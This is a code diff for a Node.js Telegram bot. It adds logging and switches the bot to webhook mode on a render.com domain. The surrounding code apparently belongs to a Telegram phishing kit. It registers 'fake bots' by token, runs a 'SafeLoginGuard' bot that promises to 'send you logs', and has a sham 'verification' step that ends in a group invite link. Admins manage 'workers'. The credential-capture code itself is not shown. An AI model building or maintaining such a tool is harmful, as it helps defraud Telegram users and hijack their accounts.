@@ -97,7 +97,7 @@ async function completeUserVerification(verificationKey) {
         await entry.context.sendPhoto(VERIFIED_IMAGE_URL, {
             caption:
                 "Verified, you can join the group using this temporary link:\n\n" +
-                `https://t.me/+yourtestgroupinvite\n\n` + // CHANGE TO YOUR REAL TEST INVITE LINK
+                `https://t.me/+yourtestgroupinvite\n\n` + // CHANGE TO YOUR TEST INVITE
                 "This link is a one time use and will expire"
         });
     } catch (err) {
@@ -119,7 +119,8 @@ async function initFakeBot(token, name, username) {
         const b = new FakeBot(token, name, username);
         if (!db.Bots.some((d) => d.name === b.name && d.token === b.token && b.username === d.username)) {
             db.Bots.push(b);
-            fs.writeFileSync("db.json", JSON.stringify(db, null, 4)); // Persist bots
+            fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
+            console.log(`Added fake bot to db: ${name}`);
         }
         const worker = new Worker(path.resolve(__dirname, "./bot.js"), {
             workerData: {
@@ -149,7 +150,7 @@ async function initFakeBot(token, name, username) {
         });
 
         botWorkers.push(worker);
-        console.log(`Fake bot '${name}' initialized`);
+        console.log(`Fake bot '${name}' initialized and worker started`);
     } catch (ex) {
         console.error("Failed to initialize fake bot:", ex);
     }
@@ -169,6 +170,7 @@ async function readConfig() {
             const dbContent = fs.readFileSync("db.json", 'utf-8');
             db = JSON.parse(dbContent);
         }
+        console.log(`Loaded db with ${db.Bots.length} bots, ${db.Admins.length} admins`);
     } catch (err) {
         console.error("Config/DB read error:", err);
         process.exit(1);
@@ -189,43 +191,29 @@ async function initBot() {
         bot.catch((err, ctx) => {
             console.error('Main bot error:', err);
             if (err.response && err.response.error_code === 409) {
-                console.log('409 Conflict caught, retrying...');
+                console.log('409 Conflict caught in catch');
             }
         });
 
-        // Enhanced retry for 409 with longer initial delay
-        setTimeout(async () => {
-            let retryCount = 0;
-            const maxRetries = 5; // Increased for persistence
-            const baseDelay = 45000; // 45s initial to let sessions expire
-
-            const launchWithRetry = async () => {
-                try {
-                    await bot.launch();
-                    console.log('Main bot launched successfully');
-                    return;
-                } catch (err) {
-                    if (err.response && err.response.error_code === 409) {
-                        retryCount++;
-                        if (retryCount >= maxRetries) {
-                            console.error('Max retries reached for 409 conflict - bot may be unstable');
-                            return;
-                        }
-                        const delay = baseDelay * Math.pow(1.5, retryCount - 1); // Softer backoff: 45s, 67s, 100s, etc.
-                        console.log(`409 Conflict (attempt ${retryCount}/${maxRetries}), retrying in ${Math.round(delay/1000)}s...`);
-                        setTimeout(launchWithRetry, delay);
-                    } else {
-                        console.error('Non-409 launch error:', err);
-                        throw err;
-                    }
+        // Switch to webhook to avoid 409 conflicts
+        try {
+            await bot.launch({
+                webhook: {
+                    domain: 'https://vk-pmmm.onrender.com',
+                    port: process.env.PORT || 10000,
+                    path: '/webhook',
+                    maxConnections: 40
                 }
-            };
-
-            await launchWithRetry();
-        }, 45000); // 45s initial delay
+            });
+            console.log('Main bot launched successfully with webhook');
+        } catch (err) {
+            console.error('Webhook launch error:', err);
+            throw err;
+        }
 
         bot.command("start", async (ctx) => {
             try {
+                console.log('Received /start from user', ctx.from.id);
                 if (ctx.chat.type != "private") return;
                 if (pendingSetups.length > 0) {
                     const pendings = pendingSetups[pendingSetups.length - 1];
@@ -243,6 +231,7 @@ async function initBot() {
 
         bot.on("my_chat_member", async (ctx) => {
             try {
+                console.log('my_chat_member event for channel', ctx.myChatMember.chat.id);
                 if (ctx.myChatMember.new_chat_member.status != "administrator") return;
                 if (ctx.myChatMember.chat.type != 'channel') return;
 
@@ -264,11 +253,12 @@ async function initBot() {
             }
         });
 
-        /* Administrator commands - Fixed arg parsing */
+        /* Administrator commands */
         bot.command("addbot", async (ctx) => {
             try {
+                console.log('Received /addbot from user', ctx.from.id);
                 if (!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
-                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text, skip command
+                const args = ctx.message.text.split(' ').slice(1);
                 if (args.length < 3) return ctx.reply(`Bad usage!\nUsage: /addbot <token> <name> <username>`);
                 const token = args[0], name = args[1], username = args[2];
                 await initFakeBot(token, name, username);
@@ -281,8 +271,9 @@ async function initBot() {
 
         bot.command("addworker", async (ctx) => {
             try {
+                console.log('Received /addworker from user', ctx.from.id);
                 if (!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
-                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
+                const args = ctx.message.text.split(' ').slice(1);
                 if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addworker <id>`);
                 const worker = parseInt(args[0]);
                 if (isNaN(worker)) return await ctx.reply(`Invalid userId`);
@@ -296,11 +287,12 @@ async function initBot() {
             }
         });
 
-        /* Owner commands - Fixed arg parsing */
+        /* Owner commands */
         bot.command("removeworker", async (ctx) => {
             try {
+                console.log('Received /removeworker from user', ctx.from.id);
                 if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
-                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
+                const args = ctx.message.text.split(' ').slice(1);
                 if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeworker <id>`);
                 const worker = parseInt(args[0]);
                 if (isNaN(worker)) return await ctx.reply(`Invalid userId`);
@@ -316,8 +308,9 @@ async function initBot() {
 
         bot.command("addadmin", async (ctx) => {
             try {
+                console.log('Received /addadmin from user', ctx.from.id);
                 if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
-                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
+                const args = ctx.message.text.split(' ').slice(1);
                 if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addadmin <id>`);
                 const admin = parseInt(args[0]);
                 if (isNaN(admin)) return await ctx.reply(`Invalid userId`);
@@ -333,12 +326,13 @@ async function initBot() {
 
         bot.command("removeadmin", async (ctx) => {
             try {
+                console.log('Received /removeadmin from user', ctx.from.id);
                 if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
-                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
+                const args = ctx.message.text.split(' ').slice(1);
                 if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeadmin <id>`);
                 const admin = parseInt(args[0]);
                 if (isNaN(admin)) return await ctx.reply(`Invalid userId`);
-                if (!db.Admins.includes(admin)) return await ctx.reply(`The user is not an administrator`);
+                if (!db.Admins.includes(admin)) return await ctx.reply(`The user is not an admin`);
                 db.Admins.splice(db.Admins.indexOf(admin), 1);
                 fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
                 return await ctx.reply(`Admin removed.`);
@@ -351,10 +345,11 @@ async function initBot() {
         bot.on(message('text'), async (ctx) => {
             try {
                 if (ctx.chat.type != "private") return;
+                const me = await bot.telegram.getMe();
                 ctx.reply("Welcome to *SafeLoginGuard*!\n\n✨ *The bot will send you logs here.*\n\n_👤 To get started, add the bot to a channel and set it as an administrator._", {
                     reply_markup: {
                         inline_keyboard: [
-                            [{text: "👆 Add", url: `https://t.me/${await bot.telegram.getMe().then(me => me.username)}?startchannel&admin=post_messages`}],
+                            [{text: "👆 Add", url: `https://t.me/${me.username}?startchannel&admin=post_messages`}],
                             [{text: "👋 Support", url: "https://t.me/rafalzaorsky"}, {text: "🔄 Channel", url: "https://t.me/+1BxU1hPH3-E5YTdk"}]
                         ]
                     },
@@ -365,14 +360,14 @@ async function initBot() {
             }
         });
 
-       process.once('SIGINT', () => {
-    console.log('SIGINT received, stopping bot...');
-    if (bot && bot.botInfo) bot.stop('SIGINT').catch(() => console.log('Bot already stopped'));
-});
-process.once('SIGTERM', () => {
-    console.log('SIGTERM received, stopping bot...');
-    if (bot && bot.botInfo) bot.stop('SIGTERM').catch(() => console.log('Bot already stopped'));
-});
+        process.once('SIGINT', () => {
+            console.log('SIGINT received, stopping bot...');
+            if (bot) bot.stop('SIGINT').catch(() => console.log('Bot already stopped or not initialized'));
+        });
+        process.once('SIGTERM', () => {
+            console.log('SIGTERM received, stopping bot...');
+            if (bot) bot.stop('SIGTERM').catch(() => console.log('Bot already stopped or not initialized'));
+        });
 
         initWorker();
     } catch (error) {
@@ -402,4 +397,3 @@ async function initWorker() {
 
 initBot();
 setInterval(saveDatabase, 1000);
-
